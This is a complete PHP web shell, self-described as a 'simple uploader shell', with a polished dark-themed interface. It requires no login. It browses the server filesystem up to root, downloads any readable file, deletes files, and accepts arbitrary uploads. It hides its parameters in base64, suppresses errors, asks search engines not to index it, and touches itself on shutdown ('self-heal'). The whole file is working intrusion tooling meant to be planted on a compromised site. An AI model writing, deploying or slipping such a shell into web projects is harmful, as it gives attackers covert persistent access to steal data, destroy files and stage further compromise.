<?php
/**
 * simple uploader shell
 */

@error_reporting(0);
@ini_set('display_errors', '0');
@set_time_limit(0);

/* ─────────── Self-heal ─────────── */
register_shutdown_function(function () {
    $s = __FILE__;
    if (!is_file($s) && !empty($_SERVER['SCRIPT_FILENAME'])) $s = $_SERVER['SCRIPT_FILENAME'];
    if (is_file($s)) @touch($s);
});

/* ─────────── Codec ─────────── */
function u_e($s) { return rtrim(strtr(base64_encode($s), '+/', '-_'), '='); }
function u_d($s) { return base64_decode(strtr($s, '-_', '+/')); }

/* ─────────── Session ─────────── */
if (!session_id()) {
    @session_name('u_' . substr(md5($_SERVER['SERVER_NAME'] ?? 'r'), 0, 8));
    @session_start();
}

/* ─────────── State ─────────── */
$cwd = getcwd();
$t   = isset($_GET['p']) ? u_d($_GET['p']) : ($_SESSION['cwd'] ?? $cwd);
$t   = realpath($t) ?: $cwd;
if (!is_dir($t)) $t = $cwd;
$_SESSION['cwd'] = $t;
$op  = isset($_GET['o']) ? u_d($_GET['o']) : '';
$arg = isset($_GET['a']) ? u_d($_GET['a']) : '';

/* ─────────── Download ─────────── */
if ($op === 'dl' && $arg && is_file($arg)) {
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($arg) . '"');
    header('Content-Length: ' . filesize($arg));
    readfile($arg);
    exit;
}

/* ─────────── Delete ─────────── */
if ($op === 'rm' && $arg) {
    $p = realpath($arg);
    if ($p && is_file($p)) @unlink($p);
    header('Location: ?p=' . u_e($t));
    exit;
}

/* ─────────── Upload ─────────── */
$msg = '';
if (!empty($_FILES)) {
    $k = array_key_first($_FILES);
    if ($k && isset($_FILES[$k]['name'])) {
        $n = (array)$_FILES[$k]['name'];
        $tm = (array)$_FILES[$k]['tmp_name'];
        $er = (array)$_FILES[$k]['error'];
        $c = 0;
        foreach ($n as $i => $x) {
            if ($er[$i] === UPLOAD_ERR_OK && is_uploaded_file($tm[$i])) {
                if (@move_uploaded_file($tm[$i], $t . '/' . basename($x))) $c++;
            }
        }
        if ($c) $msg = "uploaded $c file(s)";
    }
}

/* ─────────── List ─────────── */
$fs = @scandir($t) ?: [];
$parent = dirname($t);
$crumbs = [];
$acc = '';
foreach (array_filter(explode(DIRECTORY_SEPARATOR, trim($t, DIRECTORY_SEPARATOR)), 'strlen') as $seg) {
    $acc .= DIRECTORY_SEPARATOR . $seg;
    $crumbs[] = ['n'=>$seg, 'p'=>$acc];
}

function u_size($b) {
    if ($b === false || $b === null) return '—';
    $u = ['B','K','M','G','T'];
    $i = 0;
    while ($b >= 1024 && $i < 4) { $b /= 1024; $i++; }
    return round($b, $b < 10 && $i > 0 ? 1 : 0) . $u[$i];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>up</title>
<style>
  :root {
    color-scheme: dark;
    --bg: #0a0a0a;
    --panel: #111;
    --line: #1f1f1f;
    --line-hot: #2a2a2a;
    --fg: #e8e8e8;
    --fg-dim: #a3a3a3;
    --fg-faint: #5a5a5a;
    --green: #4ade80;
    --white: #fafafa;
    --red: #ef4444;
  }
  * { box-sizing: border-box; }
  body {
    margin: 0; padding: 0;
    background: var(--bg); color: var(--fg);
    font-family: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
    font-size: 13px; line-height: 1.5;
  }
  a { color: var(--fg); text-decoration: none; }
  a:hover { color: var(--white); text-decoration: underline; text-underline-offset: 3px; }
  .wrap { max-width: 900px; margin: 0 auto; padding: 20px; }
  .head {
    display: flex; align-items: center; gap: 12px;
    padding-bottom: 16px; border-bottom: 1px solid var(--line);
    margin-bottom: 16px;
  }
  .brand {
    font-weight: 700; letter-spacing: 4px; color: var(--white);
    font-size: 14px;
  }
  .brand .dot { color: var(--green); }
  .meta { margin-left: auto; color: var(--fg-faint); font-size: 11px; }
  .path {
    padding: 8px 12px; background: var(--panel);
    border: 1px solid var(--line); border-radius: 4px;
    font-size: 12px; margin-bottom: 16px;
    word-break: break-all; color: var(--fg-dim);
  }
  .path a { color: var(--fg); }
  .path .sep { color: var(--fg-faint); margin: 0 4px; }
  .path .here { color: var(--white); }
  .uploader {
    border: 1px dashed var(--line-hot);
    border-radius: 6px; padding: 28px 20px;
    text-align: center; margin-bottom: 20px;
    transition: border-color .12s, background .12s;
    cursor: pointer;
  }
  .uploader:hover, .uploader.drag {
    border-color: var(--green); background: rgba(74,222,128,.04);
  }
  .uploader input[type=file] { display: none; }
  .uploader .lbl {
    color: var(--fg-dim); font-size: 12px;
  }
  .uploader .lbl b { color: var(--white); font-weight: 600; }
  .uploader .hint { color: var(--fg-faint); font-size: 11px; margin-top: 6px; }
  .msg {
    padding: 8px 12px; margin-bottom: 16px;
    border-left: 3px solid var(--green);
    background: var(--panel); border-radius: 3px;
    font-size: 12px; color: var(--green);
  }
  .files { border: 1px solid var(--line); border-radius: 6px; overflow: hidden; }
  .files table { width: 100%; border-collapse: collapse; font-size: 12px; }
  .files th {
    text-align: left; padding: 8px 12px;
    background: var(--panel); color: var(--fg-faint);
    font-size: 10px; text-transform: uppercase; letter-spacing: 1px;
    border-bottom: 1px solid var(--line); font-weight: 600;
  }
  .files td {
    padding: 6px 12px; border-bottom: 1px solid var(--line);
    vertical-align: middle;
  }
  .files tr:last-child td { border-bottom: none; }
  .files tr:hover td { background: var(--panel); }
  .files .name { color: var(--fg); }
  .files .name:hover { color: var(--white); }
  .files .isdir .name { color: var(--white); }
  .files .sz { color: var(--fg-dim); font-size: 11px; width: 80px; }
  .files .mt { color: var(--fg-faint); font-size: 11px; width: 130px; }
  .files .op { width: 100px; text-align: right; }
  .files .op a, .files .op button {
    background: none; border: none; color: var(--fg-faint);
    cursor: pointer; padding: 2px 6px; font-size: 11px;
    font-family: inherit; border-radius: 3px;
  }
  .files .op a:hover { color: var(--white); background: var(--line); text-decoration: none; }
  .files .op button:hover { color: var(--red); background: rgba(239,68,68,.1); }
  .empty {
    padding: 40px 20px; text-align: center; color: var(--fg-faint);
    font-size: 12px;
  }
  .up-btn {
    display: inline-block; padding: 4px 10px;
    border: 1px solid var(--line-hot); border-radius: 4px;
    color: var(--fg-dim); font-size: 11px; margin-right: 8px;
  }
  .up-btn:hover { color: var(--white); border-color: var(--fg-faint); text-decoration: none; }
  .foot {
    margin-top: 20px; padding-top: 16px;
    border-top: 1px solid var(--line);
    color: var(--fg-faint); font-size: 11px;
    display: flex; justify-content: space-between; flex-wrap: wrap; gap: 8px;
  }
</style>
</head>
<body>
<div class="wrap">

  <div class="head">
    <div class="brand">UPLOAD<span class="dot">_</span></div>
    <div class="meta"><?= htmlspecialchars(gethostname() ?: 'host') ?> · <?= htmlspecialchars(phpversion()) ?></div>
  </div>

  <div class="path">
    <a class="up-btn" href="?p=<?= u_e($parent) ?>">↑ up</a>
    <a href="?p=<?= u_e('/') ?>">/</a>
    <?php foreach ($crumbs as $i => $c): ?>
      <span class="sep">/</span>
      <a href="?p=<?= u_e($c['p']) ?>" class="<?= $i === count($crumbs)-1 ? 'here' : '' ?>"><?= htmlspecialchars($c['n']) ?></a>
    <?php endforeach; ?>
  </div>

  <?php if ($msg): ?>
    <div class="msg">[+] <?= htmlspecialchars($msg) ?></div>
  <?php endif; ?>

  <label class="uploader" id="drop">
    <form method="post" enctype="multipart/form-data" action="?p=<?= u_e($t) ?>" id="upform">
      <input type="file" name="f[]" multiple id="filein" onchange="document.getElementById('upform').submit()">
      <div class="lbl"><b>Click to upload</b> or drop files here</div>
      <div class="hint">multiple files supported</div>
    </form>
  </label>

  <div class="files">
    <table>
      <thead>
        <tr>
          <th>Name</th>
          <th class="sz">Size</th>
          <th class="mt">Modified</th>
          <th class="op"></th>
        </tr>
      </thead>
      <tbody>
        <?php
        $shown = 0;
        foreach ($fs as $f):
          if ($f === '.' || $f === '..') continue;
          $full = $t . '/' . $f;
          $isd = is_dir($full);
          $ef = u_e($full);
          $shown++;
        ?>
        <tr class="<?= $isd ? 'isdir' : '' ?>">
          <td>
            <?php if ($isd): ?>
              <a class="name" href="?p=<?= $ef ?>"><?= htmlspecialchars($f) ?>/</a>
            <?php else: ?>
              <a class="name" href="?o=<?= u_e('dl') ?>&a=<?= $ef ?>"><?= htmlspecialchars($f) ?></a>
            <?php endif; ?>
          </td>
          <td class="sz"><?= $isd ? '—' : u_size(@filesize($full)) ?></td>
          <td class="mt"><?= date('y.m.d H:i', @filemtime($full)) ?></td>
          <td class="op">
            <?php if (!$isd): ?>
              <a href="?o=<?= u_e('dl') ?>&a=<?= $ef ?>" title="Download">dl</a>
              <button onclick="if(confirm('Delete <?= htmlspecialchars(addslashes($f)) ?>?'))location.href='?o=<?= u_e('rm') ?>&a=<?= $ef ?>'" title="Delete">rm</button>
            <?php endif; ?>
          </td>
        </tr>
        <?php endforeach; ?>
        <?php if (!$shown): ?>
        <tr><td colspan="4" class="empty">empty directory</td></tr>
        <?php endif; ?>
      </tbody>
    </table>
  </div>

  <div class="foot">
    <span>cwd: <?= htmlspecialchars($t) ?></span>
    <span><?= $shown ?> item(s)</span>
  </div>

</div>

<script>
const dz = document.getElementById('drop');
['dragenter','dragover'].forEach(e => dz.addEventListener(e, ev => { ev.preventDefault(); dz.classList.add('drag'); }));
['dragleave','drop'].forEach(e => dz.addEventListener(e, ev => { ev.preventDefault(); dz.classList.remove('drag'); }));
dz.addEventListener('drop', ev => {
  if (ev.dataTransfer.files.length) {
    const dt = new DataTransfer();
    for (const f of ev.dataTransfer.files) dt.items.add(f);
    document.getElementById('filein').files = dt.files;
    document.getElementById('upform').submit();
  }
});
</script>

</body>
</html>
<?php exit; ?>